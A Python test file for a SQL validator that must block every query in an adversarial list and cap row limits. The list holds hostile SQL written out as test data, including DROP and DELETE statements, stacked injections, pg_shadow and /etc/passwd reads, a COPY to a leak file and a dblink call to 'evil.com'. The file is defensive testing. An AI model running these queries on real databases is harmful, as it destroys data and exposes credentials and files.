"""Phase 4 validator tests. SECURITY-CRITICAL: the adversarial suite must be 100% blocked.

No network, no DB needed -- this is pure parsing/static analysis.
"""
import pytest

from app.validator import ValidationError, validate_and_prepare
from eval.golden_set import CASES

CLEAR_GOLD_SQL = [c["gold_sql"] for c in CASES if c["category"] == "clear"]

ADVERSARIAL_SQL = [
    "DROP TABLE dw.dim_customer",
    "DELETE FROM dw.fact_sales",
    "UPDATE dw.dim_product SET price_cents = 0",
    "INSERT INTO dw.dim_customer (full_name) VALUES ('x')",
    "TRUNCATE dw.fact_sales",
    "ALTER TABLE dw.dim_customer ADD COLUMN x int",
    "CREATE TABLE dw.evil (id int)",
    "CREATE TABLE evil (id int)",
    "GRANT ALL ON dw.dim_customer TO PUBLIC",
    "REVOKE SELECT ON dw.dim_customer FROM app_readonly",
    "SELECT * FROM dw.fact_sales; DROP TABLE dw.fact_sales",
    "SELECT * FROM dw.fact_sales; SELECT * FROM dw.dim_customer",
    "SELECT * FROM public.customers",
    "SELECT * FROM public.payments",
    "SELECT email FROM dw.dim_customer",  # column doesn't exist anywhere -- hallucination/PII probe
    "SELECT phone FROM dw.dim_customer",
    "SELECT card_last4 FROM dw.dim_customer",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM information_schema.columns",
    "SELECT * FROM pg_catalog.pg_shadow",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT pg_sleep(60)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT dblink_connect('host=evil.com')",
    "SELECT pg_terminate_backend(1)",
    "COPY dw.dim_customer TO '/tmp/leak.csv'",
    "SELECT * FROM dw.dim_customer WHERE 1=1; --",
    "SELECT * FROM dw.nonexistent_table",
    "SELECT nonexistent_column FROM dw.dim_customer",
    "SELECT * FROM dw.dim_customer UNION SELECT * FROM public.customers",
    "WITH x AS (DELETE FROM dw.fact_sales RETURNING *) SELECT * FROM x",
    "EXECUTE some_prepared_statement",
    "DO $$ BEGIN DELETE FROM dw.fact_sales; END $$",
    "CALL some_procedure()",
    "VACUUM dw.fact_sales",
]


@pytest.mark.parametrize("sql", CLEAR_GOLD_SQL, ids=range(len(CLEAR_GOLD_SQL)))
def test_legitimate_golden_queries_pass(sql):
    """Every query our own golden set relies on must survive the validator unchanged in intent."""
    result = validate_and_prepare(sql, max_rows=1000)
    assert result.strip().upper().startswith("SELECT")


@pytest.mark.parametrize("sql", ADVERSARIAL_SQL, ids=range(len(ADVERSARIAL_SQL)))
def test_adversarial_sql_is_blocked(sql):
    with pytest.raises(ValidationError):
        validate_and_prepare(sql, max_rows=1000)


def test_block_rate_is_100_percent():
    """The explicit headline number the Phase 4 gate requires."""
    blocked = 0
    for sql in ADVERSARIAL_SQL:
        try:
            validate_and_prepare(sql, max_rows=1000)
        except ValidationError:
            blocked += 1
    rate = blocked / len(ADVERSARIAL_SQL)
    assert rate == 1.0, f"unsafe_query_block_rate = {rate:.1%}, must be 100%"


def test_limit_injected_when_missing():
    result = validate_and_prepare("SELECT customer_key FROM dw.dim_customer", max_rows=50)
    assert "LIMIT 50" in result.upper()


def test_existing_limit_under_max_is_kept():
    result = validate_and_prepare("SELECT customer_key FROM dw.dim_customer LIMIT 5", max_rows=1000)
    assert "LIMIT 5" in result.upper()


def test_existing_limit_over_max_is_capped():
    result = validate_and_prepare("SELECT customer_key FROM dw.dim_customer LIMIT 999999", max_rows=1000)
    assert "LIMIT 1000" in result.upper()


def test_select_star_cannot_reach_other_schema_even_without_column_check():
    """Regression test for the exact gap found by hand: qualify() alone does not reject
    `SELECT * FROM public.x` because there's no column to resolve -- the explicit table
    allowlist in _check_tables is what catches this."""
    with pytest.raises(ValidationError, match="schema"):
        validate_and_prepare("SELECT * FROM public.customers", max_rows=1000)


def test_case_insensitive_schema_bypass_blocked():
    with pytest.raises(ValidationError):
        validate_and_prepare("SELECT * FROM PUBLIC.customers", max_rows=1000)
    with pytest.raises(ValidationError):
        validate_and_prepare("select * from Public.Customers", max_rows=1000)
